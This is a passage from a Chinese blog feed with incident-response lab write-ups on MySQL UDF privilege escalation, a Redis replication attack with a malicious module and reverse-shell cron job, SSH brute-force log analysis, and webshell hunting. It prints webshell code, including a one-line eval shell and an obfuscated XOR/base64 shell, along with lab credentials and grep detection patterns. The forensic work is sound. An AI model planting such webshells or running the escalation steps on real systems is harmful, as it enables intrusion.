href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h2><p>能提权说明已经是连接上了，查找一下与账号有关的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7ecfaf23490aa467.png"></p><p>第一条显示了账号密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;334cc35b3c704593&quot;,&quot;cms&quot;,&quot;3306&quot;);<br></code></pre></td></tr></table></figure><p>直接连接上 mysql，查看是否为 UDF 提权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;secure_file_priv&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/398721c2edc14fb8.png"></p><p><code>secure_file_priv</code> 为空，因为 <code>secure_file_priv</code> 决定了是否有上传文件等操作的权限，当 <code>secure_file_priv</code> 为空时其也就表示了可以对任意路径进行操作，并且是 root 账户，满足了 UDF 提权。</p><p>进入 <code>/usr/lib/mysql/plugin</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/lib/mysql/plugin<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d4aa08327ee675f.png"></p><p>发现了 <code>udf.so</code> 文件，md5 加密路径 <code>/usr/lib/mysql/plugin/udf.so</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;b1818bde4e310f3d23f1005<span class="hljs-number">185b973e7</span>&#125;<br></code></pre></td></tr></table></figure><p>UDF 提权详解：<a href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】</a></p><h2 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h2><p>查询数据库中有哪些函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a74176608947258f.png"></p><p>同样使用此函数执行 <code>whoami</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b692f5b8099f8b85.png"></p><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;mysql&#125;</span><br></code></pre></td></tr></table></figure><h1 id="redis-应急响应"><a href="#redis-应急响应" class="headerlink" title="redis 应急响应"></a>redis 应急响应</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs armasm">服务器场景操作系统 Linux<br>服务器账号密码 root xjredis<br><br>任务环境说明<br>    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！<br>    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查<br>    <br><span class="hljs-number">1</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客攻击成功的 <span class="hljs-built_in">IP</span> 为多少,将黑客 <span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客反弹 shell 的<span class="hljs-built_in">IP</span> 为多少,将反弹 shell 的<span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交<br><span class="hljs-number">5</span>.通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h2><p>进入 <code>/var/log</code> 目录查看日志信息 <code>redis.log</code></p><p>有三个 IP : 192.168.100.13，192.168.31.55 和 192.168.100.20</p><p>而 IP 192.168.100.13 进行了 <code>MASTER &lt;-&gt; REPLICA sync started</code> 主从复制攻击，但攻击失败</p><p><img src="https://img.dkdun.cn/v1/2025/12/3dc650c4f2f9fc84.png"></p><p>192.168.31.55 并没有明显的恶意行为</p><p><img src="https://img.dkdun.cn/v1/2025/12/ce557a216b22426f.png"></p><p>同样 192.168.100.20 也进行了攻击，并且成功了，还执行了恶意模块操作 <code>Module &#39;system&#39; loaded from ./exp.so</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.20</span>&#125;<br></code></pre></td></tr></table></figure><p>主从复制攻击，是指将一台 Redis 服务器的数据复制到其他的 Redis 服务器，攻击机为主机，被攻击的机器为从机，利用复制的功能通过 <code>FULLRESYNC</code> 将主机上的文件同步复制至从机上，然后再利用 <code>redis4.x/5.x</code> 指令可以通过外部加载的特性去加载恶意的 so 文件，从而实现利用 redis 完成提权</p><h2 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h2><p>从前面已经知道了恶意 so 文件 <code>exp.so</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ce557a216b22426f.png"></p><p>从根目录找到 <code>exp.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings exp.so | grep <span class="hljs-string">&quot;flag&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a9db1ef51d18e8ad.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;XJ_78f012d7-<span class="hljs-number">42</span>fc-<span class="hljs-number">49</span>a8-<span class="hljs-number">8</span>a8c-e74c87ea109b&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h2><p>查看 <code>syslog.1</code> 系统日志有一堆反弹 shell 的记录</p><p><img src="https://img.dkdun.cn/v1/2025/12/879b605608dcde37.png"></p><p>说明攻击者写了计划任务，IP 为 <code>192.168.100.20</code>，查看有无定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/546b6965a386a933.png"></p><p>定时任务中反弹 shell 的 IP 为 <code>192.168.100.13</code> </p><p>攻击机切换了好几次 IP，从 192.168.100.13:8888 切换到 192.168.31.55:8888，然后再切换到 192.168.100.20:8888，这里的 flag 只算定时任务的 IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h2><p>一般 ssh 登录有两种：</p><p>用户生成一对 SSH 密钥对，包括私钥和公钥。公钥被上传并存储在目标服务器的用户账户下的 <code>~/.ssh/authorized_keys</code> 文件中</p><p>直接使用用户名和密码登录</p><p>那这里可以查看 Redis 配置或查看 SSH 登录日志</p><p>访问 <code>.ssh</code> 目录中的 <code>authorized_keys</code> 文件，包含了 redis 的公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">REDIS0009�      redis-ver5.0.1�<br>�edis-bits�@�ctime�tO�dused-mem�XU<br> aof-preamble���xxsshB9<br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user<br><br>�&lt;#5M<br></code></pre></td></tr></table></figure><p><code>xj-test-user</code> 是一个用户名，搜索找到了 <a href="https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636">https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/7b8cae845bb7d611.png"></p><p>然后拼接</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>&#123;xj-test-user-wow-you-<span class="hljs-built_in">find</span>-<span class="hljs-built_in">flag</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5-1"><a href="#Q5-1" class="headerlink" title="Q5"></a>Q5</h2><p>检查系统路径中的命令，在 <code>/usr/bin</code> 文件夹下查看</p><p><img src="https://img.dkdun.cn/v1/2025/12/cf508bd0ab1819a2.png"></p><p>发现 ps 的权限为 <code>-rwxrwxrwx</code>，正常权限应该为 <code>-rwxr-xr-x</code>，查看 ps 的内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/bc847e291fd31b47.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;c195i2923381905517d818e<span class="hljs-number">313792d196</span>&#125;<br></code></pre></td></tr></table></figure><p>简单分析一下这个脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/bin/bash</span><br>oldifs=<span class="hljs-string">&quot;<span class="hljs-variable">$IFS</span>&quot;</span><br>IFS=<span class="hljs-string">&#x27;\$n&#x27;</span><br>result=$(ps_ <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span>|grep -v <span class="hljs-string">&#x27;threadd&#x27;</span> )<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$v</span>\t&quot;</span>;<br><span class="hljs-keyword">done</span><br>IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$oldifs</span>&quot;</span><br></code></pre></td></tr></table></figure><p>获取 <code>ps_</code> 命令的输出，并按行处理和输出结果，列出系统中运行的进程，并过滤掉包含 <code>threadd</code> 关键字的进程信息，应该是一个进程监控脚本，检查特定进程的状态</p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
      <category>玄机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玄机-第一章</title>
    <link href="/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <url>/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>webshell 查杀 &amp; Linux 日志分析 &amp; Linux 入侵排查</p><span id="more"></span><h1 id="查找-shell-方法"><a href="#查找-shell-方法" class="headerlink" title="查找 shell 方法"></a>查找 shell 方法</h1><p>查找有 Webshell 特征的文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.jsp&quot;</span> | xargs grep <span class="hljs-string">&quot;exec(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.asp&quot;</span> | xargs grep <span class="hljs-string">&quot;execute(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.aspx&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><p>对于免杀 Webshell，可以查看是否使用编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;base64_decode&quot;</span><br></code></pre></td></tr></table></figure><h1 id="Linux-日志分析"><a href="#Linux-日志分析" class="headerlink" title="Linux 日志分析"></a>Linux 日志分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">账号 root 密码 linuxrz<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1</span>.有多少<span class="hljs-built_in">IP</span>在爆破主机ssh的root帐号，如果有多个使用<span class="hljs-string">&quot;,&quot;</span>分割<br><span class="hljs-number">2.</span>ssh爆破成功登陆的<span class="hljs-built_in">IP</span>是多少，如果有多个使用<span class="hljs-string">&quot;,&quot;</span>分割<br><span class="hljs-number">3</span>.爆破用户名字典是什么？如果有多个使用<span class="hljs-string">&quot;,&quot;</span>分割<br><span class="hljs-number">4</span>.登陆成功的<span class="hljs-built_in">IP</span>共爆破了多少次<br><span class="hljs-number">5</span>.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Linux 默认日志存放在 <code>/var/log</code> 目录下，所以直接进入</p><p><img src="https://img.dkdun.cn/v1/2025/12/76c546db2b1372b4.png"></p><p>发现有很多日志文件，<code>auth.log.1</code> 文件是一个非常重要的系统日志文件，包含了许多与安全相关的信息，可以用于监控、分析和排查系统故障和安全问题，所以我们可以查看它的内容信息，根据题目来看在爆破 root 账号，那么可以 <code>grep</code> 过滤一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/daa25390b87f2a2f.png"></p><p>找到三个 IP：192.168.200.32，192.168.200.2，192.168.200.31</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>,<span class="hljs-number">192.168.200.31</span>,<span class="hljs-number">192.168.200.32</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>需要查看成功登录的 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/55b06204f84935bf.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>对登陆失败的用户名进行查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ef2709c7e4dc3737.png"></p><p>可以发现有 6 个用户：test1、test2、test3、root、user、hello</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">flag&#123;<span class="hljs-keyword">user</span>,hello,root,test3,test2,test1&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>前面 Q2 已经查找到了 IP <code>192.168.200.2</code> 是登陆成功了的，所以这里看 192.168.200.2 的次数就正确</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dbca134151e16bd1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>题目说新建了一个用户，查找 <code>new user</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/86b14ffe43a8a247.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;test2&#125;</span><br></code></pre></td></tr></table></figure><h1 id="webshell-查杀"><a href="#webshell-查杀" class="headerlink" title="webshell 查杀"></a>webshell 查杀</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs q">靶机账号密码 root xjwebshell<br><span class="hljs-number">1.</span>黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br><span class="hljs-number">2.</span>黑客使用的什么工具的shell github地址的<span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125;<br><span class="hljs-number">3.</span>黑客隐藏shell的完整路径的<span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx<br><span class="hljs-number">4.</span>黑客免杀马完整路径 <span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h2><p>一般来说网页文件一般在 <code>/var/www/html</code> 路径下，可以进入目录查找，<code>php</code> 文件查找危险函数 <code>eval()</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:/var/www/html# find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>./include/gz.php:               <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./include/Db/.Mysqli.php:               <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./shell.php:&lt;?php phpinfo();@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>查看 gz.php 内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/aaf79b903e9214fd.png"></p><p>拿到 flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">027ccd04</span>-<span class="hljs-number">5065</span>-<span class="hljs-number">48b6</span>-a32d-77c704a5e26d&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h2><p>可以看到 webshell 内容中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-comment">//创建或者重启一个会话</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//设置程序最长运行时间：永久</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// 关闭错误报告</span><br></code></pre></td></tr></table></figure><p>这是哥斯拉生成的 webshell 特征，哥斯拉项目地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">39392</span>de3218c333f794befef07ac9257&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h2><p>寻找隐藏 shell，在 Q1 中有危险函数的还有其他文件，访问目录查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./include/Db/.Mysqli.php<br></code></pre></td></tr></table></figure><p>对路径 <code>/var/www/html/include/Db/.Mysqli.php</code> 进行 md5 加密</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ip</span><span class="hljs-number">-10</span><span class="hljs-number">-0</span><span class="hljs-number">-10</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/html/include/Db</span><span class="hljs-comment"># echo -n &quot;/var/www/html/include/Db/.Mysqli.php&quot; |md5sum |cut -d &quot; &quot; -f1</span><br>aebac0e58cd6c5fad1695ee4d1ac1919<br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h2><p>免杀马通过静态检测是检测不到的，因为在免杀的过程中将 webshell 的特征值以及特征函数都给去掉了，但是 webshell 执行会在网站日志留下记录，所以可以到日志里面看有无可疑记录</p><p>目录下有 <code>apache2</code> 日志记录，然后查看其目录下的 <code>access.log</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/133ef6fc18302b15.png"></p><p>可以看到 <code>/wap</code> 下的 top.php 文件执行了两次 <code>phpinfo()</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/f9ff2a9d776dfeed.png"></p><p>查看 top.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br></code></pre></td></tr></table></figure><p>是免杀马了，md5 加密<code>/var/www/html/wap/top.php</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">账号：root 密码：linuxruqin<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1.</span>web目录存在木马，请找到木马的密码提交<br><span class="hljs-number">2</span>.服务器疑似存在不死马，请找到不死马的密码提交<br><span class="hljs-number">3</span>.不死马是通过哪个文件生成的，请提交文件名<br><span class="hljs-number">4</span>.黑客留下了木马文件，请找出黑客的服务器<span class="hljs-built_in">ip</span>提交<br><span class="hljs-number">5</span>.黑客留下了木马文件，请找出黑客服务器开启的监端口提交<br></code></pre></td></tr></table></figure><h2 id="Q1-2"><a 